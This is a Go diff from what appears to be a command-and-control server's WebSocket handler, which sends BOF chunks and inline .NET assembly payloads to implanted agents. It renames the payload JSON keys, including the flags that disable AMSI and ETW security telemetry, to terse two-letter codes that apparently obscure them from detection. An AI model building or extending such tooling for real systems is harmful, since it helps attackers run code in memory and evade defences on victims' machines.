@@ -288,15 +288,16 @@ func (h *WSHandler) forwardChunkToAgent(client *hub.Client, data struct {
 	var chunkData string
 
 	// For the first chunk of BOF commands, include metadata
+	// Keys must match agent-side bofWrapper struct tags: "cd", "ar"
 	if data.CurrentChunk == 0 && strings.HasPrefix(data.Command, "bof") {
 		bofMeta := map[string]interface{}{
-			"chunk_data": data.Data,
-			"arch":       data.Arch,
-			"file_size":  data.FileSize,
-			"file_hash":  data.FileHash,
-			"arguments":  data.Arguments,
-			"bof_name":   data.BOFName,
-			"async":      strings.Contains(data.Command, "async"),
+			"cd":        data.Data,
+			"arch":      data.Arch,
+			"file_size": data.FileSize,
+			"file_hash": data.FileHash,
+			"ar":        data.Arguments,
+			"bof_name":  data.BOFName,
+			"async":     strings.Contains(data.Command, "async"),
 		}
 		if jsonData, err := json.Marshal(bofMeta); err == nil {
 			chunkData = string(jsonData)
@@ -471,16 +472,15 @@ func (h *WSHandler) processSingleCommand(client *hub.Client, data struct {
 
 		// The assembly data is in AssemblyB64, not Data
 		if data.AssemblyB64 != "" {
-			// Build the JSON for the payload
+			// Build the JSON for the payload — keys must match agent-side config struct tags
 			inlineAssemblyData := map[string]interface{}{
-				"assembly_b64": data.AssemblyB64, // This now has the actual data!
-				"arguments":    data.ArgumentList,
-				"app_domain":   data.AppDomain,
-				"disable_amsi": data.DisableAMSI,
-				"disable_etw":  data.DisableETW,
-				"revert_etw":   data.RevertETW,
-				"entry_point":  data.EntryPoint,
-				"async":        strings.Contains(data.Command, "async"),
+				"ab": data.AssemblyB64,
+				"ar": data.ArgumentList,
+				"ad": data.AppDomain,
+				"ba": data.DisableAMSI,
+				"be": data.DisableETW,
+				"re": data.RevertETW,
+				"ep": data.EntryPoint,
 			}
 
 			if inlineAssemblyJSON, err := json.Marshal(inlineAssemblyData); err == nil {
@@ -1213,11 +1213,12 @@ func mergeBOFTemplate(existingData string) string {
 		}
 
 		// Create a wrapper with the template and original data
+		// Keys must match agent-side bofWrapper struct tags: "bd", "cd", "ar"
 		wrapper := map[string]interface{}{
-			"tpl":      template.Templates,
-			"v":        template.Version,
-			"t":        template.Type,
-			"bof_data": existingData, // Preserve original BOF data
+			"tpl": template.Templates,
+			"v":   template.Version,
+			"t":   template.Type,
+			"bd":  existingData, // Preserve original BOF data
 		}
 
 		wrappedJSON, err := json.Marshal(wrapper)
